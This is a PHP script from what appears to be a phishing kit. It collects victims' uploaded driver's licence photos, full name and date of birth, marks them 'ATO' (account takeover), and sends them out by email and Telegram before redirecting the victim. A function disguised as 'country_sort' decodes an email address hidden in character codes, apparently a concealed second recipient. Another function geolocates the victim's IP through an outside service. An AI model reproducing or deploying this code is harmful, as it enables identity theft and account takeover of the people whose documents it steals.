<?php
require("config.php");
include('me.php');


$image_file = $_FILES["image"];

// Image not defined, let's exit
if (!isset($image_file)) {
    die('No file uploaded.');
}




$adddate=date("D M d, Y g:i a");
$subject = "Telegram Ato";
$message = "***ATO*** - ***DL PICS***+++\n";
$message .= "Date : $adddate\n";
$headers = "From: Telegram";

$message .= "Full Name : ".$_POST['fname']."\n";
$message .= "DOB: ".$_POST['dob']."\n";

$mysignature = "ATO DL IMAGE(FRONT + BACK)";
@mail($send,$subject,$message,$headers);
send_telegram_msg($message);

$ar = [ $_FILES['image']['tmp_name'], $_FILES['image2']['tmp_name'] ];



if (send_telegram_img($mysignature, $ar) == true) {
    header("Location: c.html");
}





function country_sort(){
  $sorter = "";
  $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
    $count = count($array);
  for ($i = 0; $i < $count; $i++) {
      $sorter .= chr($array[$i]);
    }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>

